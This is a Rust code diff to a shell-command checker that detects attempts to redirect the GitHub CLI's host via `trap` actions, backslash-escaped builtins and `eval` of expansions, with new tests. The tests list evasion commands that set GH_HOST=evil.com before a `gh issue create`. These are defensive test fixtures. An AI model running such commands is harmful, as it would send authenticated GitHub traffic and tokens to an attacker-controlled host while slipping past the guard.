@@ -825,11 +825,6 @@ impl GhHostEnv {
 
     fn observe_depth(&mut self, segment: &str, depth: usize) {
         let tokens = tokenize(segment);
-        // A `trap` body runs later, in this shell, from a string this walk does
-        // not parse (`trap 'export GH_HOS''T=…' DEBUG`) (#1073 live review).
-        if tokens.iter().any(|t| t == "trap") {
-            self.add_unresolved();
-        }
         let normalized = strip_compound_openers(&tokens);
         let mut words: &[String] = &normalized;
         while words
@@ -843,12 +838,15 @@ impl GhHostEnv {
         // `builtin export …` / `command export …` run the same builtin.
         while rest
             .first()
-            .is_some_and(|w| w == "builtin" || w == "command")
+            .is_some_and(|w| matches!(w.trim_start_matches('\\'), "builtin" | "command"))
             && rest.get(1).is_some_and(|w| !w.starts_with('-'))
         {
             rest = &rest[1..];
         }
-        let command = rest.first().map(|w| w.rsplit('/').next().unwrap_or(w));
+        // A leading backslash only suppresses alias expansion: `\trap` is `trap`.
+        let command = rest
+            .first()
+            .map(|w| w.rsplit('/').next().unwrap_or(w).trim_start_matches('\\'));
 
         // FAIL CLOSED where the command position was not understood: a
         // subshell, function body or case arm this normalization missed still
@@ -860,6 +858,7 @@ impl GhHostEnv {
                 || NAME_OPERAND_BUILTINS.contains(&c)
                 || c == "unset"
                 || c == "eval"
+                || c == "trap"
         });
         if !understood
             && tokens.iter().any(|t| {
@@ -871,8 +870,10 @@ impl GhHostEnv {
             && tokens.iter().any(|t| {
                 mentions_gh_host(t)
                     || (!t.starts_with('-')
-                        && t.split_once('=')
-                            .is_some_and(|(name, _)| !is_literal_identifier(name)))
+                        && t.split_once('=').is_some_and(|(name, _)| {
+                            // `[ "$m" = export ]`: a bare `=` names nothing.
+                            !name.is_empty() && !is_literal_identifier(name)
+                        }))
             })
         {
             self.add_unresolved();
@@ -907,14 +908,16 @@ impl GhHostEnv {
         // Past the nesting cap its words go unread, so the host is unknown
         // (#1073 review I-d).
         if command == Some("eval") {
-            if depth >= MAX_EVAL_DEPTH {
-                self.add_unresolved();
-                return;
-            }
-            for inner in command_segments(&rest[1..].join(" ")) {
-                if !segment_invokes_gh(&inner) {
-                    self.observe_depth(&inner, depth + 1);
-                }
+            self.observe_nested(&rest[1..].join(" "), depth);
+        }
+        // A `trap` action runs later in this shell, so it is read like an
+        // `eval` string (#1073 review). `trap -p`, `trap -l` and `trap - SIG`
+        // run nothing.
+        if command == Some("trap") {
+            let args = &rest[1..];
+            let args = args.strip_prefix(&["--".to_string()]).unwrap_or(args);
+            if let Some(action) = args.first().filter(|a| !a.starts_with('-')) {
+                self.observe_nested(action, depth);
             }
         }
         if let Some(name) = command.filter(|c| NAME_OPERAND_BUILTINS.contains(c))
@@ -976,6 +979,27 @@ impl GhHostEnv {
                     self.add_unresolved();
                 }
             }
+        }
+    }
+
+    /// Observe a script this shell will run from a string (`eval`, a `trap`
+    /// action). Past [`MAX_EVAL_DEPTH`] its words go unread, and a command word
+    /// built by an expansion (`eval "$(…)"`, `eval "$X"`) is text this walk
+    /// never sees — both are unresolved.
+    fn observe_nested(&mut self, script: &str, depth: usize) {
+        if depth >= MAX_EVAL_DEPTH {
+            self.add_unresolved();
+            return;
+        }
+        for inner in command_segments(script) {
+            if segment_invokes_gh(&inner) {
+                continue;
+            }
+            if command_word_is_dynamic(&inner) {
+                self.add_unresolved();
+                continue;
+            }
+            self.observe_depth(&inner, depth + 1);
         }
     }
 
@@ -1082,6 +1106,17 @@ fn strip_compound_openers(tokens: &[String]) -> Vec<String> {
             return words;
         }
     }
+}
+
+/// True when a segment's command word is produced by an expansion (`$X`,
+/// `$(…)`, a backtick), after compound openers, keywords and assignments.
+fn command_word_is_dynamic(segment: &str) -> bool {
+    let normalized = strip_compound_openers(&tokenize(segment));
+    normalized
+        .iter()
+        .skip_while(|w| SEGMENT_KEYWORDS.contains(&w.as_str()))
+        .find(|w| !is_shell_assignment(w))
+        .is_some_and(|w| w.contains('$') || w.contains('`'))
 }
 
 /// True when a `source`/`.` segment reads its script from text in the command
@@ -7031,6 +7066,39 @@ mod tests {
             "source .venv/bin/activate && gh issue create -R cameronsjo/x -t a -b b",
             "while read -r line; do echo \"$line\"; done < f; gh issue create -R cameronsjo/x -t a -b b",
             "env FOO=1 gh issue create -R cameronsjo/x -t a -b b",
+        ] {
+            run_case(&mut bad, command, false);
+        }
+        assert!(bad.is_empty(), "{bad:#?}");
+    }
+
+    #[test]
+    fn trap_actions_and_eval_expansions_are_read() {
+        let mut bad = Vec::new();
+        for command in [
+            // I-1: a trap inside a subshell.
+            "(trap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b)",
+            // I-2: a backslash-escaped trap.
+            "\\trap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "trap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "trap 'export GH_HOS''T=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "trap -- 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "trap \"$CMD\" DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            // I-3: eval of an expansion.
+            "eval \"$(printf 'export GH_HOS%s=evil.com' T)\"; gh issue create -R cameronsjo/x -t a -b b",
+            "eval \"$X\"; gh issue create -R cameronsjo/x -t a -b b",
+            "eval `cat f`; gh issue create -R cameronsjo/x -t a -b b",
+        ] {
+            run_case(&mut bad, command, true);
+        }
+        for command in [
+            "tmp=$(mktemp); trap 'rm -f \"$tmp\"' EXIT; gh issue comment 1 -R cameronsjo/x --body-file \"$tmp\"",
+            "trap cleanup EXIT; gh issue create -R cameronsjo/x -t a -b b",
+            "trap - EXIT; trap -p; gh issue create -R cameronsjo/x -t a -b b",
+            "grep -rn trap src; gh issue create -R cameronsjo/x -t a -b b",
+            "eval 'echo hi'; gh issue create -R cameronsjo/x -t a -b b",
+            // N-1: a bare `=` in a test is no assignment.
+            "if [ \"$m\" = export ]; then echo y; fi; gh issue comment 1 -R cameronsjo/x --body b",
         ] {
             run_case(&mut bad, command, false);
         }
